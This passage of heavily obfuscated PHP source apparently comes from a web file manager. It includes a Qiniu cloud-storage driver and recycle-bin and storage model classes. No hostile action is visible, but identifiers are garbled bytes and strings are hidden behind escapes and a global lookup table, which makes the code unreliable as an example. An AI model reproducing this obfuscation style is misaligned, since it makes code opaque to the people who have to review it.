$this->getPathOuter($·åÏ„úÊ); } public function copyFile($‘¼¨‰Ãå, $²›“Ëƒ”) { $ˆ ÈÊ = $this->bucketManager->copy($this->bucket, $‘¼¨‰Ãå, $this->bucket, $²›“Ëƒ”, !0); return $ˆ ÈÊ ? !1 : $this->getPathOuter($²›“Ëƒ”); } public function moveFile($…¸“ï®, $½ıü‰ıç) { $¨éŞ×³Œ = $this->bucketManager->move($this->bucket, $…¸“ï®, $this->bucket, $½ıü‰ıç, !0); return $¨éŞ×³Œ ? !1 : $this->getPathOuter($½ıü‰ıç); } public function delFile($ü§‹˜¯Í) { if (!$this->exist($ü§‹˜¯Í)) { return !0; } $áÔÄ¯ = $this->bucketManager->delete($this->bucket, $ü§‹˜¯Í); if (!$áÔÄ¯) { return !0; } return $áÔÄ¯->code() == 612 ? !0 : !1; } public function delFolder($ˆ†ÆÏøƒ) { $ê¾üù™ğ =& $_SERVER[öæÛ¿©¿]; if (!$this->exist($ˆ†ÆÏøƒ)) { return !0; } $this->listItemCache = !1; $®¾—ÉÁ = $this->fileList($ˆ†ÆÏøƒ); $this->listItemCache = !0; $ ÏÑ‚ = trim($ˆ†ÆÏøƒ, $ê¾üù™ğ[8]) . $ê¾üù™ğ[8]; if (!empty($ˆ†ÆÏøƒ) && $ˆ†ÆÏøƒ !== $ê¾üù™ğ[229] && !in_array($ ÏÑ‚, $®¾—ÉÁ[$ê¾üù™ğ[85]])) { $®¾—ÉÁ[$ê¾üù™ğ[85]][] = $ ÏÑ‚; } $¹‘§ÛÏÖ = $this->delByBatch($®¾—ÉÁ[$ê¾üù™ğ[86]]); if (!$¹‘§ÛÏÖ) { return !1; } $¹‘§ÛÏÖ = $this->delByBatch($®¾—ÉÁ[$ê¾üù™ğ[85]]); if (!$¹‘§ÛÏÖ) { return !1; } return $this->delFile($ ÏÑ‚); } private function delByBatch($şüãßÜƒ) { foreach (array_chunk($şüãßÜƒ, 1000) as $ãı×Û£) { $§™‡Ä = $this->bucketManager->buildBatchDelete($this->bucket, $ãı×Û£); list($Ğ†Äúçî, $ò•Ù€Ÿä) = $this->bucketManager->batch($§™‡Ä); if ($ò•Ù€Ÿä) { return !1; } } return !0; } public function rename($äİŒ÷Ù°, $ÒÅ¦•Øä) { return $this->renameObject($äİŒ÷Ù°, $ÒÅ¦•Øä); } public function fileInfo($ØÔÚ¨, $şï”ÁŠä = false, $ß“Äç— = array()) { $¦áË§¹— =& $_SERVER[öæÛ¿©¿]; $îÇÔß­œ = array($¦áË§¹—[32] => $this->pathThis($ØÔÚ¨), $¦áË§¹—[87] => $this->getPathOuter($¦áË§¹—[8] . $ØÔÚ¨), $¦áË§¹—[33] => $¦áË§¹—[231], $¦áË§¹—[79] => isset($ß“Äç—[$¦áË§¹—[1681]]) ? $ß“Äç—[$¦áË§¹—[1681]] : 0, $¦áË§¹—[167] => $this->ext($ØÔÚ¨)); if ($şï”ÁŠä) { return $îÇÔß­œ; } $îÇÔß­œ[$¦áË§¹—[232]] = $îÇÔß­œ[$¦áË§¹—[88]] = 0; $îÇÔß­œ[$¦áË§¹—[233]] = $îÇÔß­œ[$¦áË§¹—[234]] = !0; if (empty($ß“Äç—)) { $ß“Äç— = $this->objectMeta($ØÔÚ¨); if (!$ß“Äç—) { return $îÇÔß­œ; } } if (isset($ß“Äç—[$¦áË§¹—[235]]) && $ß“Äç—[$¦áË§¹—[235]]) { $îÇÔß­œ[$¦áË§¹—[236]] = $ß“Äç—[$¦áË§¹—[235]]; } if (isset($ß“Äç—[$¦áË§¹—[246]]) && $ß“Äç—[$¦áË§¹—[246]]) { $îÇÔß­œ[$¦áË§¹—[236]] = $ß“Äç—[$¦áË§¹—[246]]; } if (isset($ß“Äç—[$¦áË§¹—[1682]])) { $îÇÔß­œ[$¦áË§¹—[88]] = substr($ß“Äç—[$¦áË§¹—[1682]] . $¦áË§¹—[12], 0, 10); } if (isset($ß“Äç—[$¦áË§¹—[1681]])) { $îÇÔß­œ[$¦áË§¹—[79]] = $ß“Äç—[$¦áË§¹—[1681]]; } return $îÇÔß­œ; } public function folderInfo($‡úßŞ¿Ö, $é€²êëî = false) { $”Şó¸ˆ‚ =& $_SERVER[öæÛ¿©¿]; $ö¦í°×‰ = array($”Şó¸ˆ‚[32] => $this->pathThis($‡úßŞ¿Ö), $”Şó¸ˆ‚[87] => $this->getPathOuter($”Şó¸ˆ‚[8] . $‡úßŞ¿Ö), $”Şó¸ˆ‚[33] => $”Şó¸ˆ‚[78]); if ($é€²êëî) { return $ö¦í°×‰; } $ö¦í°×‰[$”Şó¸ˆ‚[232]] = $ö¦í°×‰[$”Şó¸ˆ‚[88]] = 0; $ö¦í°×‰[$”Şó¸ˆ‚[233]] = $ö¦í°×‰[$”Şó¸ˆ‚[234]] = !0; $‡úßŞ¿Ö = rtrim($‡úßŞ¿Ö, $”Şó¸ˆ‚[8]) . $”Şó¸ˆ‚[8]; $Ÿ¾âÆÊ‰ = $this->objectMeta($‡úßŞ¿Ö); if (isset($Ÿ¾âÆÊ‰[$”Şó¸ˆ‚[1682]])) { $ö¦í°×‰[$”Şó¸ˆ‚[88]] = substr($Ÿ¾âÆÊ‰[$”Şó¸ˆ‚[1682]] . $”Şó¸ˆ‚[12], 0, 10); } return $ö¦í°×‰; } public function listPath($ÙÉâƒÏÂ, $«Õõ¶£Ü = false) { $£ß‚È˜ =& $_SERVER[öæÛ¿©¿]; $°Ÿƒ¦¥ç = $this->fileList($ÙÉâƒÏÂ, $£ß‚È˜[8], !0); foreach ($°Ÿƒ¦¥ç[$£ß‚È˜[85]] as $¼¬¸©ÔÎ => $ñÒ¢¿ŠÁ) { $°Ÿƒ¦¥ç[$£ß‚È˜[85]][$¼¬¸©ÔÎ] = $this->folderInfo($ñÒ¢¿ŠÁ, $«Õõ¶£Ü); } foreach ($°Ÿƒ¦¥ç[$£ß‚È˜[86]] as $¼¬¸©ÔÎ => $ñÒ¢¿ŠÁ) { $°Ÿƒ¦¥ç[$£ß‚È˜[86]][$¼¬¸©ÔÎ] = $this->fileInfo($ñÒ¢¿ŠÁ[$£ß‚È˜[32]], $«Õõ¶£Ü, $ñÒ¢¿ŠÁ); } return $°Ÿƒ¦¥ç; } public function has($õıçˆÃ, $ñÊşµ„İ = false, $Î÷©×İ = true) { $ÇäÁ§‚ =& $_SERVER[öæÛ¿©¿]; $õıçˆÃ = trim($õıçˆÃ, $ÇäÁ§‚[8]); $¦Æéº§• = empty($õıçˆÃ) && $õıçˆÃ !== $ÇäÁ§‚[229] ? $ÇäÁ§‚[12] : $õıçˆÃ . $ÇäÁ§‚[8]; $¹îàÍ®œ = $ÇäÁ§‚[12]; $µ²àª´ò = 500; $şÅ“ò¤” = $ÇäÁ§‚[8]; $ĞÅ·ô¡ò = $¨¾øÈ¥ñ = 0; while (!0) { check_abort(); list($‰¡ŞöÚ¥, $Í‚ï‡ã½) = $this->bucketManager->listFiles($this->bucket, $¦Æéº§•, $¹îàÍ®œ, $µ²àª´ò, $şÅ“ò¤”); if ($Í‚ï‡ã½) { break; } $¹îàÍ®œ = array_key_exists($ÇäÁ§‚[1629], $‰¡ŞöÚ¥) ? $¹îàÍ®œ = $‰¡ŞöÚ¥[$ÇäÁ§‚[1683]] : $ÇäÁ§‚[12]; if ($ñÊşµ„İ) { if (!empty($‰¡ŞöÚ¥[$ÇäÁ§‚[1684]])) { $ĞÅ·ô¡ò += count($‰¡ŞöÚ¥[$ÇäÁ§‚[1684]]); } if (!empty($‰¡ŞöÚ¥[$ÇäÁ§‚[1685]])) { $¨¾øÈ¥ñ += count($‰¡ŞöÚ¥[$ÇäÁ§‚[1685]]); } if ($¹îàÍ®œ === $ÇäÁ§‚[12]) { break; } continue; } if ($Î÷©×İ) { if (!empty($‰¡ŞöÚ¥[$ÇäÁ§‚[1684]])) { return !0; } } else { if (!empty($‰¡ŞöÚ¥[$ÇäÁ§‚[1685]])) { return !0; } } if ($¹îàÍ®œ === $ÇäÁ§‚[12]) { break; } } if ($ñÊşµ„İ) { return array($ÇäÁ§‚[240] => $ĞÅ·ô¡ò, $ÇäÁ§‚[241] => $¨¾øÈ¥ñ); } return !1; } public function listAll($ü“õ şş) { $ÅôÊ±åò =& $_SERVER[öæÛ¿©¿]; $ÃúªÙ–— = $this->fileList($ü“õ şş, $ÅôÊ±åò[12], !0); $ú²‰èàŒ = array_to_keyvalue($ÃúªÙ–—[$ÅôÊ±åò[86]], $ÅôÊ±åò[32]); foreach ($ÃúªÙ–—[$ÅôÊ±åò[85]] as $îãã™¸ª) { if (is_string($îãã™¸ª)) { $ú²‰èàŒ[$îãã™¸ª] = array($ÅôÊ±åò[79] => 0); } } return $this->listAllFiles($ü“õ şş, $ú²‰èàŒ); } private function fileList($µ¢¨‘±¢, $Ù…—ÉÖ = '', $ùıÉ»½ş = 0) { $ò·´èõ× =& $_SERVER[öæÛ¿©¿]; $µ¢¨‘±¢ = trim($µ¢¨‘±¢, $ò·´èõ×[8]); $Ä§ùß†× = empty($µ¢¨‘±¢) && $µ¢¨‘±¢ !== $ò·´èõ×[229] ? $ò·´èõ×[12] : $µ¢¨‘±¢ . $ò·´èõ×[8]; $¸ÍÚô£§ = $ò·´èõ×[12]; $¢Û›ä›£ = 1000; $íƒÂ–Ÿñ = $˜®·áş™ = array(); while (!0) { check_abort(); list($åßß“Ü‚, $‘Œ òØÓ) = $this->bucketManager->listFiles($this->bucket, $Ä§ùß†×, $¸ÍÚô£§, $¢Û›ä›£, $Ù…—ÉÖ); if ($‘Œ òØÓ) { break; } $¸ÍÚô£§ = array_key_exists($ò·´èõ×[1629], $åßß“Ü‚) ? $¸ÍÚô£§ = $åßß“Ü‚[$ò·´èõ×[1683]] : $ò·´èõ×[12]; $¢¦—±Æà = isset($åßß“Ü‚[$ò·´èõ×[1684]]) ? $åßß“Ü‚[$ò·´èõ×[1684]] : array(); $ì½Š™«É = isset($åßß“Ü‚[$ò·´èõ×[1685]]) ? $åßß“Ü‚[$ò·´èõ×[1685]] : array(); foreach ($¢¦—±Æà as $¨ÓŠöøÎ) { if ($¨ÓŠöøÎ[$ò·´èõ×[95]] == $Ä§ùß†×) { continue; } $¨ê˜ñÙ‚ = $¨ÓŠöøÎ[$ò·´èõ×[95]]; $Şòâ‡ÁĞ = $¨ÓŠöøÎ[$ò·´èõ×[1681]]; $¨ÓŠöøÎ[$ò·´èõ×[32]] = $¨ê˜ñÙ‚; $¨ÓŠöøÎ[$ò·´èõ×[79]] = $Şòâ‡ÁĞ; $ôÂÎŞù® = $Şòâ‡ÁĞ == 0 && substr($¨ê˜ñÙ‚, strlen($¨ê˜ñÙ‚) - 1, 1) == $ò·´èõ×[8] ? !0 : !1; $this->cacheMethodInfoSet($¨ê˜ñÙ‚, $ôÂÎŞù®, $¨ÓŠöøÎ); if ($ôÂÎŞù®) { $íƒÂ–Ÿñ[] = $¨ê˜ñÙ‚; continue; } $˜®·áş™[] = $ùıÉ»½ş ? $¨ÓŠöøÎ : $¨ê˜ñÙ‚; } foreach ($ì½Š™«É as $¨ê˜ñÙ‚) { if ($¨ê˜ñÙ‚ == $Ä§ùß†×) { continue; } $íƒÂ–Ÿñ[] = $¨ê˜ñÙ‚; $this->cacheMethodInfoSet($¨ê˜ñÙ‚, !0); } if ($¸ÍÚô£§ === $ò·´èõ×[12]) { break; } } $this->cacheMethodInfoSet($µ¢¨‘±¢, !0); return array($ò·´èõ×[85] => $íƒÂ–Ÿñ, $ò·´èõ×[86] => $˜®·áş™); } public function canRead($–Ç¢ßˆ–) { return $this->exist($–Ç¢ßˆ–) ? !0 : !1; } public function canWrite($µøù”çŞ) { return $this->exist($µøù”çŞ) ? !0 : !1; } public function getContent($´Ş€şÛ×) { return $this->fileSubstr($´Ş€şÛ×, 0, -1); } public function setContent($¦Ğ¾ŞŒí, $ÏÛäƒÎß = '') { $îÑ¶ŠÒ½ = $this->tempFile($this->pathThis($¦Ğ¾ŞŒí)); file_put_contents($îÑ¶ŠÒ½, $ÏÛäƒÎß); if ($this->upload($¦Ğ¾ŞŒí, $îÑ¶ŠÒ½)) { $this->tempFileRemve($îÑ¶ŠÒ½); return !0; } return !1; } public function refreshUrls($Ò²³Í¼‡) { $Äê‘‡‰ü =& $_SERVER[öæÛ¿©¿]; $ı·§Š‹Å = array(); if (is_array($Ò²³Í¼‡)) { foreach ($Ò²³Í¼‡ as $Èê…¼åş) { $ı·§Š‹Å[] = $this->link($Èê…¼åş); } } else { $ı·§Š‹Å[] = $this->link($Ò²³Í¼‡); } $ÄÂĞ”ğ‹ = new Qiniu\Cdn\CdnManager($this->auth); list($æ™Ô©‘, $ä„­¾øš) = $ÄÂĞ”ğ‹->refreshUrls($ı·§Š‹Å); if ($ä„­¾øš) { return !1; } return $æ™Ô©‘[$Äê‘‡‰ü[1313]] == $Äê‘‡‰ü[852] ? !0 : !1; } public function fileSubstr($¤¡Ù‚ş, $±ä…ø, $èï×¡Ñ¢) { $æŸ¾ÁØÁ =& $_SERVER[öæÛ¿©¿]; if (!($Óï•ØûÌ = $this->link($¤¡Ù‚ş))) { return !1; } $ªÊ®Â¦ = !1; if ($èï×¡Ñ¢ > 0) { $ÊóÚ°á = $±ä…ø + $èï×¡Ñ¢ - 1; $ªÊ®Â¦ = array($æŸ¾ÁØÁ[1550] . $±ä…ø . $æŸ¾ÁØÁ[473] . $ÊóÚ°á); } $Ÿïş²‰ = url_request($Óï•ØûÌ, $æŸ¾ÁØÁ[1551], !1, $ªÊ®Â¦); return $Ÿïş²‰[$æŸ¾ÁØÁ[842]] ? $Ÿïş²‰[$æŸ¾ÁØÁ[1335]] : !1; } public function upload($‹ã›µó, $×§¡¨°, $êİıÅôƒ = false, $÷çİæœª = REPEAT_REPLACE) { if (!$×§¡¨° || !@file_exists($×§¡¨°)) { return !1; } $©¡­Ë = new Qiniu\Storage\UploadManager(); $òïêÁÉ = $this->auth->uploadToken($this->bucket, $‹ã›µó); $ëŸŞış‡ = get_file_mime(get_path_ext($×§¡¨°)); list($“ï¶šôš, $Òè™­³ª) = $©¡­Ë->putFile($òïêÁÉ, $‹ã›µó, $×§¡¨°, null, $ëŸŞış‡); return $Òè™­³ª ? !1 : $this->getPathOuter($‹ã›µó); } public function uploadFormData($ ²ïšïë, $¡ñççã™ = 3600) { return $this->uploadToken($ ²ïšïë, $¡ñççã™); } public function uploadMultiData($ÍÖ×€ºÌ, $Ä›ä÷Ãú = 3600) { return $this->uploadToken($ÍÖ×€ºÌ, $Ä›ä÷Ãú); } private function uploadToken($ÑŒ”äè, $ù˜ñ«Îò = 3600) { $Â÷Ä›ÎÖ =& $_SERVER[öæÛ¿©¿]; $œ‚ä€Î¯ = $ù˜ñ«Îò; $¯‚ë±»ê = array($Â÷Ä›ÎÖ[1686] => $Â÷Ä›ÎÖ[1687]); $ŞÂô² = $ÑŒ”äè; $’­İ±şä = $this->auth->uploadToken($this->bucket, $ŞÂô², $œ‚ä€Î¯, $¯‚ë±»ê, !0); $–½û·ß² = empty($this->region) || $this->region == $Â÷Ä›ÎÖ[1688] ? $Â÷Ä›ÎÖ[12] : $Â÷Ä›ÎÖ[473] . $this->region; $’äö¢Åı = http_type() . "\x3a\57\57\x75\160\154\x6f\x61\x64{$–½û·ß²}\x2e\161\x69\156\151\165\160\x2e\x63\x6f\155\57"; return array($Â÷Ä›ÎÖ[1689] => $’­İ±şä, $Â÷Ä›ÎÖ[1553] => $’äö¢Åı); } public function download($‰Ş¡Ãçİ, $ò„åÃùí) { $Û³Œ”‰å = IO::getPathInner(IO::mkfile($ò„åÃùí)); if (!($º¿—¥â‘ = $this->link($‰Ş¡Ãçİ))) { return !1; } $şÁÂí²ï = 0; $Ó–¦çò„ = 1024 * 200; $•ú·‰µ = fopen($Û³Œ”‰å, $_SERVER[öæÛ¿©¿][1690]); while (!0) { $À•Şñ‘¥ = $this->fileSubstr($‰Ş¡Ãçİ, $şÁÂí²ï, $Ó–¦çò„); if ($À•Şñ‘¥ === !1) { return !1; } fwrite($•ú·‰µ, $À•Şñ‘¥); $şÁÂí²ï += $Ó–¦çò„; if (strlen($À•Şñ‘¥) < $Ó–¦çò„) { break; } } fclose($•ú·‰µ); return $ò„åÃùí; } public function link($ı§ß»·¤, $åŒœÏò­ = '') { if (!$this->isFile($ı§ß»·¤)) { return !1; } $ÌÍ¡øŞß = $this->getHost() . $_SERVER[öæÛ¿©¿][8] . $this->pathEncode($ı§ß»·¤) . $åŒœÏò­; return $this->auth->privateDownloadUrl($ÌÍ¡øŞß, 3600 * 12); } public function fileOut($¦ôÚì¿†, $¯ÙËÁë² = false, $¸£üº« = false, $á©¢‰­ = '') { $¾¤Öéßõ =& $_SERVER[öæÛ¿©¿]; if ($this->isFileOutServer()) { return $this->fileOutServer($¦ôÚì¿†, $¯ÙËÁë², $¸£üº«, $á©¢‰­); } if (!$¸£üº«) { $¸£üº« = $this->pathThis($¦ôÚì¿†); } $ÒÛ†®Ÿí = $¯ÙËÁë² ? $¾¤Öéßõ[1691] . rawurlencode($¸£üº«) : $¾¤Öéßõ[12]; $Ñ„Ñöı  = $this->link($¦ôÚì¿†, $ÒÛ†®Ÿí); $this->fileOutLink($Ñ„Ñöı ); } public function fileOutServer($£¯ˆ­¶, $şíêÕ = false, $Ş„÷ÜÌ = false, $–ÚØ¿œ› = '') { parent::fileOut($£¯ˆ­¶, $şíêÕ, $Ş„÷ÜÌ, $–ÚØ¿œ›); } public function fileOutImage($©öĞÒµ™, $â§şÑõ = 250) { if ($this->size($©öĞÒµ™) > 1024 * 1024 * 20) { return $this->fileOutImageServer($©öĞÒµ™, $â§şÑõ); } $ªØıŞÕ = $this->link($©öĞÒµ™, $_SERVER[öæÛ¿©¿][1692] . $â§şÑõ); $this->fileOutLink($ªØıŞÕ); } public function fileOutImageServer($–ÉÇ‹Îµ, $¢Ì¿áèå = 250) { parent::fileOutImage($–ÉÇ‹Îµ, $¢Ì¿áèå); } public function hashMd5($¾ÛøúŞ) { $üåæ·¡ =& $_SERVER[öæÛ¿©¿]; $ì£÷öÇİ = $this->objectMeta($¾ÛøúŞ); return isset($ì£÷öÇİ[$üåæ·¡[246]]) ? $ì£÷öÇİ[$üåæ·¡[246]] : !1; $©ÜÂÄ°ö = $this->link($¾ÛøúŞ, $üåæ·¡[1693]); } public function size($¨éÎ¬§¨) { $àÕ•Áªı = $this->objectMeta($¨éÎ¬§¨); return $àÕ•Áªı ? $àÕ•Áªı[$_SERVER[öæÛ¿©¿][79]] : 0; } public function info($ø¤íüÉĞ) { if ($this->isFolder($ø¤íüÉĞ)) { return $this->folderInfo($ø¤íüÉĞ); } else { if ($this->isFile($ø¤íüÉĞ)) { return $this->fileInfo($ø¤íüÉĞ); } } return !1; } public function exist($÷ÖøŸ™¦) { return $this->isFile($÷ÖøŸ™¦) || $this->isFolder($÷ÖøŸ™¦); } public function isFile($¼Ÿ¶“¾°) { return !$this->isFolder($¼Ÿ¶“¾°) && $this->objectMeta($¼Ÿ¶“¾°); } public function isFolder($·ØÔ²Íµ) { return $this->cacheMethod($_SERVER[öæÛ¿©¿][178], $·ØÔ²Íµ); } protected function objectMeta($ µéğ²³) { return $this->cacheMethod($_SERVER[öæÛ¿©¿][180], $ µéğ²³); } protected function _objectMeta($º„Á­) { $˜½Âº¢š =& $_SERVER[öæÛ¿©¿]; list($ËŞÕ¥½, $ã«İîÍŞ) = $this->bucketManager->stat($this->bucket, $º„Á­); if ($ËŞÕ¥½) { $ËŞÕ¥½[$˜½Âº¢š[79]] = intval($ËŞÕ¥½[$˜½Âº¢š[1681]]); } return $ËŞÕ¥½; } protected function _isFolder($¥Ş×‘¿) { $ªüˆæ =& $_SERVER[öæÛ¿©¿]; if ($¥Ş×‘¿ == $ªüˆæ[12] || $¥Ş×‘¿ == $ªüˆæ[8]) { return !0; } list($œ‚ã›İ¢, $Ğ’ˆ§) = $this->bucketManager->listFiles($this->bucket, trim($¥Ş×‘¿, $ªüˆæ[8]) . $ªüˆæ[8], $ªüˆæ[12], 1, $ªüˆæ[8]); return !empty($œ‚ã›İ¢[$ªüˆæ[1684]]) || !empty($œ‚ã›İ¢[$ªüˆæ[1685]]) ? !0 : !1; } } goto AÑŠ¾ù‰„; d‡Ä¢Ç´› : class SourceRecycleModel extends ModelBase { protected $tableName = "\151\157\137\163\x6f\x75\162\143\145\x5f\162\145\x63\x79\143\154\x65"; protected $dataAuto = array(array("\143\162\145\x61\x74\x65\124\151\155\145", "\164\x69\x6d\x65", "\151\156\163\x65\162\x74", "\146\x75\x6e\143\164\151\157\x6e")); public function listData($ò§â¬ş˜ = false) { $õö¥¥®¬ =& $_SERVER[öæÛ¿©¿]; $ò§â¬ş˜ = $ò§â¬ş˜ ? $ò§â¬ş˜ : USER_ID; $××·Ââ¤ = $this->where(array($õö¥¥®¬[1916] => $ò§â¬ş˜))->select(); return array_to_keyvalue($××·Ââ¤, $õö¥¥®¬[12], $õö¥¥®¬[192]); } public function moveToRecycle($­–ŠÈÏ) { $ñëæÄŒ =& $_SERVER[öæÛ¿©¿]; $„–˜Å½ = Model($ñëæÄŒ[1478]); $åê°¯„ = $„–˜Å½->sourceInfo($­–ŠÈÏ); if (!$åê°¯„ || $åê°¯„[$ñëæÄŒ[516]] == $ñëæÄŒ[91]) { return; } $òğ£ÌÏ… = array($ñëæÄŒ[502] => $­–ŠÈÏ, $ñëæÄŒ[1916] => USER_ID, $ñëæÄŒ[667] => $åê°¯„[$ñëæÄŒ[189]], $ñëæÄŒ[668] => $åê°¯„[$ñëæÄŒ[585]], $ñëæÄŒ[671] => $åê°¯„[$ñëæÄŒ[600]]); $this->add($òğ£ÌÏ…); $this->recycleMove($­–ŠÈÏ, 1); if ($åê°¯„[$ñëæÄŒ[496]] == $ñëæÄŒ[91]) { $Ÿ“¤ÈÁ = array($ñëæÄŒ[671] => array($ñëæÄŒ[631], $åê°¯„[$ñëæÄŒ[600]] . $­–ŠÈÏ . $ñëæÄŒ[632])); $„–˜Å½->where($Ÿ“¤ÈÁ)->setField($ñëæÄŒ[516], 1); } } public function clear() { $this->remove(!1); } public function remove($‰Œìº´„ = false, $—É«ÕÌ‘ = false) { $È…äÏÒÖ =& $_SERVER[öæÛ¿©¿]; $—É«ÕÌ‘ = $—É«ÕÌ‘ ? $—É«ÕÌ‘ : USER_ID; $¥Ú¢©µ” = Model($È…äÏÒÖ[1478]); $’ÚúÄä = $this->listData($—É«ÕÌ‘); $‰Œìº´„ = $‰Œìº´„ === !1 ? !1 : $‰Œìº´„; $ñìÎóúÁ = array(); foreach ($’ÚúÄä as $¯àì¢´ˆ) { if ($‰Œìº´„ != !1 && !in_array($¯àì¢´ˆ, $‰Œìº´„)) { continue; } $º¶ÆŒË = $¥Ú¢©µ”->sourceInfo($¯àì¢´ˆ); $¥Ú¢©µ”->remove($¯àì¢´ˆ, !1); $®–ÏÎá¡ = $º¶ÆŒË[$È…äÏÒÖ[189]] . $È…äÏÒÖ[11] . $º¶ÆŒË[$È…äÏÒÖ[585]]; $ñìÎóúÁ[$®–ÏÎá¡] = array($È…äÏÒÖ[667] => $º¶ÆŒË[$È…äÏÒÖ[189]], $È…äÏÒÖ[585] => $º¶ÆŒË[$È…äÏÒÖ[585]]); $this->where(array($È…äÏÒÖ[192] => $¯àì¢´ˆ))->delete(); } foreach ($ñìÎóúÁ as $¿¹ß§³®) { $¥Ú¢©µ”->targetSpaceUpdate($¿¹ß§³®[$È…äÏÒÖ[189]], $¿¹ß§³®[$È…äÏÒÖ[585]]); } } public function restore($àçåúı‹ = false) { $øĞÁãÅ¼ = $this->listData(); $this->_restoreSource($øĞÁãÅ¼, $àçåúı‹); } public function removeUserAll($ªÖ¾å¡) { $this->remove(!1, $ªÖ¾å¡); } public function restoreItem($İ¸³™æ) { $this->_restoreSource(array($İ¸³™æ), array($İ¸³™æ)); } private function _restoreSource($÷İĞöÖ×, $ŸĞ°å) { $ß„·«³ =& $_SERVER[öæÛ¿©¿]; $°Şİœ¥¤ = Model($ß„·«³[1478]); $ŸĞ°å = $ŸĞ°å == !1 ? !1 : $ŸĞ°å; if (!$÷İĞöÖ×) { return !0; } $ºÆ»ª•œ = array(); foreach ($÷İĞöÖ× as $ñâ¨Û¿) { if ($ŸĞ°å != !1 && !in_array($ñâ¨Û¿, $ŸĞ°å)) { continue; } $÷ìâËÕ = $°Şİœ¥¤->sourceInfo($ñâ¨Û¿); $àµç†ö¤ = $°Şİœ¥¤->sourceInfo($÷ìâËÕ[$ß„·«³[191]]); if ($àµç†ö¤[$ß„·«³[516]] == $ß„·«³[91]) { continue; } $°Şİœ¥¤->lockMoveStart($ñâ¨Û¿); $this->recycleMove($ñâ¨Û¿, 0); if ($÷ìâËÕ[$ß„·«³[496]] == $ß„·«³[91]) { $ŠïĞ¿Ë = array($ß„·«³[671] => array($ß„·«³[631], $÷ìâËÕ[$ß„·«³[600]] . $ñâ¨Û¿ . $ß„·«³[632])); $°Şİœ¥¤->where($ŠïĞ¿Ë)->setField($ß„·«³[516], 0); $this->restoreFolderChildren($ñâ¨Û¿, $÷İĞöÖ×); } $this->where(array($ß„·«³[192] => $ñâ¨Û¿))->delete(); $°Şİœ¥¤->folderSizeReset($÷ìâËÕ[$ß„·«³[191]]); $ºÆ»ª•œ[] = $÷ìâËÕ[$ß„·«³[191]]; if ($÷ìâËÕ[$ß„·«³[496]] == $ß„·«³[91]) { $ºÆ»ª•œ[] = $ñâ¨Û¿; } $°Şİœ¥¤->lockMoveEnd($ñâ¨Û¿); } $°Şİœ¥¤->updateModifyTime($ºÆ»ª•œ); } private function restoreFolderChildren($¬³¢ƒá, $üëçı) { $¼‹î‡¾Ç =& $_SERVER[öæÛ¿©¿]; $½šÅ–è = Model($¼‹î‡¾Ç[1478]); $ ©¸‘èë = array($¼‹î‡¾Ç[192] => array($¼‹î‡¾Ç[7], array())); foreach ($üëçı as $Ÿø×ù›×) { if ($Ÿø×ù›× == $¬³¢ƒá) { continue; } if (!$½šÅ–è->isParentOf($¬³¢ƒá, $Ÿø×ù›×)) { continue; } $—ìò±åÅ = $½šÅ–è->sourceInfo($Ÿø×ù›×); if ($—ìò±åÅ[$¼‹î‡¾Ç[496]] == $¼‹î‡¾Ç[91]) { $ ©¸‘èë[] = array($¼‹î‡¾Ç[671] => array($¼‹î‡¾Ç[631], $—ìò±åÅ[$¼‹î‡¾Ç[600]] . $Ÿø×ù›× . $¼‹î‡¾Ç[632])); } else { $ ©¸‘èë[$¼‹î‡¾Ç[192]][1][] = $Ÿø×ù›×; } } if (!$ ©¸‘èë[$¼‹î‡¾Ç[192]][1]) { unset($ ©¸‘èë[$¼‹î‡¾Ç[192]]); } if (!$ ©¸‘èë) { return; } if (is_array($ ©¸‘èë[$¼‹î‡¾Ç[192]]) && is_array($ ©¸‘èë[$¼‹î‡¾Ç[192]][1])) { $ ©¸‘èë[$¼‹î‡¾Ç[192]][1] = array_unique($ ©¸‘èë[$¼‹î‡¾Ç[192]][1]); } $ ©¸‘èë[$¼‹î‡¾Ç[1112]] = $¼‹î‡¾Ç[2231]; $½šÅ–è->where($ ©¸‘èë)->setField($¼‹î‡¾Ç[516], 1); } private function recycleMove($üòœˆÕŒ, $÷‹óè€ = 1) { $ƒ¶‚¿Ş =& $_SERVER[öæÛ¿©¿]; $Ê£ë¿Øé = Model($ƒ¶‚¿Ş[1478]); $Ô­ÙâÇ´ = Model($ƒ¶‚¿Ş[2463]); $Ö°‰€‚ = array($ƒ¶‚¿Ş[192] => $üòœˆÕŒ); if ($÷‹óè€) { $Ê£ë¿Øé->where($Ö°‰€‚)->setField($ƒ¶‚¿Ş[516], 1); $Ô­ÙâÇ´->eventRecycle($üòœˆÕŒ, $ƒ¶‚¿Ş[2464]); } else { $Ó³†¹ = $Ê£ë¿Øé->where($Ö°‰€‚)->find(); $¸ÑÙÉ’  = $Ó³†¹[$ƒ¶‚¿Ş[496]] == $ƒ¶‚¿Ş[91]; $œìô›½¥ = $Ê£ë¿Øé->fileNameAuto($Ó³†¹[$ƒ¶‚¿Ş[191]], $Ó³†¹[$ƒ¶‚¿Ş[32]], REPEAT_RENAME_FOLDER, $¸ÑÙÉ’ ); if ($œìô›½¥ != $Ó³†¹[$ƒ¶‚¿Ş[32]]) { $Ê£ë¿Øé->rename($üòœˆÕŒ, $œìô›½¥); } $Ê£ë¿Øé->where($Ö°‰€‚)->setField($ƒ¶‚¿Ş[516], 0); $Ô­ÙâÇ´->eventRecycle($üòœˆÕŒ, $ƒ¶‚¿Ş[2465]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\x65\155\56\x73\157\165\162\x63\x65\123\145\x63\162\145\x74\114\151\163\x74"; public $field = array("\x73\x6f\165\162\x63\145\111\x44", "\x74\171\x70\145\111\104", "\x63\x72\145\141\164\x65\x55\x73\x65\x72"); } class StorageModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\x65\155\x2e\x73\164\x6f\162\141\147\145\114\x69\x73\164"; public $field = array("\x6e\x61\155\x65", "\x73\x69\x7a\145\115\x61\x78", "\x73\171\163\x74\x65\x6d", "\144\x65\146\141\165\154\164", "\x64\162\151\166\x65\x72", "\143\157\x6e\x66\x69\147"); public function listData($ÙÃ¦ÉïØ = false, $“ì¨¬­£ = "\x6d\x6f\x64\x69\x66\x79\x54\151\155\145", $©¤®ĞÊñ = false) { $á‡Ş®£Å =& $_SERVER[öæÛ¿©¿]; $µßÍó™ƒ = parent::listData($ÙÃ¦ÉïØ, $“ì¨¬­£, $©¤®ĞÊñ); if ($ÙÃ¦ÉïØ) { return $µßÍó™ƒ; } $Äí¨Â‹¹ = array(); if ($GLOBALS[$á‡Ş®£Å[2466]]) { $Äí¨Â‹¹ = 